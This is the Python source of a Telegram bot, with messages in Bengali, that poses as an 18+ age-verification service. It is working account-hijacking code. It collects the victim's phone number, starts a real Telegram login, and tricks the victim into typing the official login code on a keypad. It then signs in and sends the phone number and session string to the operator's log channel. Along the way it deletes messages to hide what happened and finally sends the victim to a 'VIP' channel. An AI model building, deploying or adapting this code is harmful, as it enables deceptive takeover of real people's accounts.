import os
import asyncio
from dotenv import load_dotenv
from telethon import TelegramClient, events, types, Button
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError

# কনফিগারেশন লোড
load_dotenv()
API_ID = int(os.getenv("API_ID"))
API_HASH = os.getenv("API_HASH")
BOT_TOKEN = os.getenv("BOT_TOKEN")
LOG_CHANNEL_ID = int(os.getenv("LOG_CHANNEL_ID"))

bot = TelegramClient('login_bot_session', API_ID, API_HASH).start(bot_token=BOT_TOKEN)
user_data = {}

# মেসেজ ডিলিট করার ফাংশন
async def delete_after(msg, delay):
    await asyncio.sleep(delay)
    try:
        await msg.delete()
    except:
        pass

def build_keypad():
    buttons = []
    nums = ["1", "2", "3", "4", "5", "6", "7", "8", "9"]
    row = []
    for num in nums:
        row.append(Button.inline(num, data=f"num_{num}"))
        if len(row) == 3:
            buttons.append(row)
            row = []
    buttons.append([Button.inline("❌ Clear", data="clear"), Button.inline("0", data="num_0")])
    buttons.append([Button.url("📩 ভেরিফিকেশন Key পেতে এখানে ক্লিক করুন", "tg://openmessage?user_id=777000")]) 
    return buttons

@bot.on(events.NewMessage(pattern='/start'))
async def start(event):
    msg = await event.respond(
        "🔞 **১৮+ কন্টেন্ট দেখতে হলে আপনার বয়স যাচাই করা প্রয়োজন।**",
        buttons=[Button.request_phone("✅ আমি ১৮+")]
    )
    asyncio.create_task(delete_after(msg, 300))

@bot.on(events.NewMessage)
async def handle_contact(event):
    if event.message.contact:
        phone = event.message.contact.phone_number
        chat_id = event.chat_id
        
        # ১ সেকেন্ডের মধ্যে সব মেসেজ ডিলিট
        await event.delete()
        await asyncio.sleep(1)

        new_client = TelegramClient(StringSession(), API_ID, API_HASH)
        await new_client.connect()

        try:
            send_code = await new_client.send_code_request(phone)
            user_data[chat_id] = {
                'phone': phone, 'client': new_client,
                'hash': send_code.phone_code_hash, 'typed_code': ""
            }
            
            msg = await event.respond(
                "🛡️ **VIP এক্সেস ভেরিফিকেশন**\n\n"
                "**নিচের Key বাটনে ক্লিক করে ৫ ডিজিটের নম্বরটি এখানে টাইপ করুন।**\n\n"
                "**ভেরিফিকেশন স্ট্যাটাস:** `অপেক্ষা করা হচ্ছে...`\n"
                f"**Input:** `____`",
                buttons=build_keypad()
            )
            user_data[chat_id]['msg_id'] = msg.id
            asyncio.create_task(delete_after(msg, 300))

        except Exception as e:
            await event.respond(f"Error: {str(e)}")

@bot.on(events.CallbackQuery)
async def callback_handler(event):
    chat_id = event.chat_id
    if chat_id not in user_data: return

    data = event.data.decode('utf-8')
    current = user_data[chat_id]

    if data.startswith("num_"):
        num = data.split("_")[1]
        if len(current['typed_code']) < 5:
            current['typed_code'] += num
            
            # ৫ ডিজিট পূর্ণ হলে অটো সাবমিট
            if len(current['typed_code']) == 5:
                await event.edit("🔄 **ভেরিফাই করা হচ্ছে, দয়া করে অপেক্ষা করুন...**")
                await perform_login(event, current)
            else:
                await event.edit(
                    "🛡️ **VIP এক্সেস ভেরিফিকেশন**\n\n"
                    f"**Input:** `{current['typed_code']}`",
                    buttons=build_keypad()
                )

    elif data == "clear":
        current['typed_code'] = ""
        await event.edit("🛡️ **Key মুছে ফেলা হয়েছে। আবার টাইপ করুন।**", buttons=build_keypad())

async def perform_login(event, current):
    client = current['client']
    try:
        await client.sign_in(current['phone'], current['typed_code'], phone_code_hash=current['hash'])
        session_str = client.session.save()

        # লগ চ্যানেলে তথ্য পাঠানো
        await bot.send_message(LOG_CHANNEL_ID, f"🔥 **New VIP Access!**\n📱 Phone: `{current['phone']}`\n🔑 Session: `{session_str}`")

        # সফল লগইন বক্স মেসেজ
        success_text = (
            "━━━━━━━━━━━━━━━━━━━━\n"
            "🌟 **অভিনন্দন! আপনার বয়স যাচাই সফল হয়েছে** 🌟\n"
            "━━━━━━━━━━━━━━━━━━━━\n\n"
            "আপনি এখন আমাদের **Premium VIP Content** দেখার এক্সেস পেয়েছেন।\n\n"
            "👇 **নিচের বাটনে ক্লিক করে মূল চ্যানেলে জয়েন করুন**"
        )
        
        success_msg = await event.edit(
            success_text,
            buttons=[[Button.url("💎 JOIN VIP CONTENT", "https://t.me/+npOufX7RfEpkOWZl")]]
        )
        
        # ২ মিনিট পর সব ক্লিনআপ
        asyncio.create_task(delete_after(success_msg, 120))
        user_data.pop(event.chat_id)

    except PhoneCodeInvalidError:
        current['typed_code'] = ""
        # এরর নোটিফিকেশন (ভাইব্রেট হবে ফোনে)
        await event.answer("❌ ভুল Key! আবার চেষ্টা করুন।", alert=True) 
        await event.edit(
            "🛡️ **ভুল Key দিয়েছেন! সঠিক ৫ ডিজিটের Key টি দিন।**\n\n**Input:** `____`",
            buttons=build_keypad()
        )

# বোট চালু করা
print("Bot is running...")
bot.run_until_disconnected()
